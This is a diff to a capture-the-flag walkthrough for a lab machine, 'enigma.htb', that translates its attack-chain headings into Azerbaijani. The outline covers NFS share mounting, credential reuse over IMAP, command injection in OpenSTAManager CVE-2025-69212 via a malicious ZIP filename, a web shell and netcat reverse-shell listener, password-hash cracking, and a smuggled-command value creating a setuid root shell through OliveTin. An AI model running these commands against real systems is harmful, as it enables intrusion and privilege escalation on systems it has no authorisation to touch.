@@ -10,40 +10,40 @@
 ## Hücum Zənciri
 
 ```text
-Reconnaissance
+Kəşfiyyat
 ├── nmap -sC -sV -p- enigma.htb → 22 (SSH, keys only), 80 (nginx)
 ├── 110/143/993/995 (Dovecot POP3/IMAP)
 └── 111/2049 + mountd/nlockmgr (NFS)
 
-Foothold (NFS)
+İlkin Giriş (NFS)
 ├── showmount -e enigma.htb → /srv/nfs/onboarding *
 ├── mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
 ├── pdftotext New_Employee_Access.pdf → kevin:<PASSWORD>
 └── /etc/hosts: 10.129.239.191 enigma.htb mail001.enigma.htb
 
-Lateral Movement (Password Reuse + Mail)
+Üfüqi Yerdəyişmə (Password Reuse + Mail)
 ├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
 ├── Roundcube → sarah:<PASSWORD>
 ├── IT email → OpenSTAManager: admin:<PASSWORD>
 └── /etc/hosts: support_001.enigma.htb
 
-Exploitation (OpenSTAManager CVE-2025-69212)
+İstismar (OpenSTAManager CVE-2025-69212)
 ├── Version: 2.9.8 (info.php)
 ├── OS Command Injection via P7M files (decodeP7M → exec without escaping)
 ├── ZIP with malicious filename → Sales → Invoices → Importazione FE
 ├── curl "http://support_001.enigma.htb/files/SHELL.php?c=id" → www-data
 └── Reverse shell: nc -lvnp 4444
 
-Lateral Movement (Config → MySQL → Hash)
+Üfüqi Yerdəyişmə (Config → MySQL → Hash)
 ├── config.inc.php → brollin / <PASSWORD>
 ├── mysql → SELECT username, password FROM zz_users
 ├── haris:$2y$... (bcrypt)
 └── hashcat -m 3200 → haris:<PASSWORD>
 
-User Flag
+İstifadəçi Bayrağı
 └── su haris → user.txt
 
-Privilege Escalation (OliveTin)
+Səlahiyyətlərin Artırılması (OliveTin)
 ├── ps aux → /usr/local/bin/OliveTin (root, 127.0.0.1:1337)
 ├── /etc/OliveTin/config.yaml → backup_database (shell: mysqldump {{ db_pass }})
 ├── Exploit: db_pass = "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"
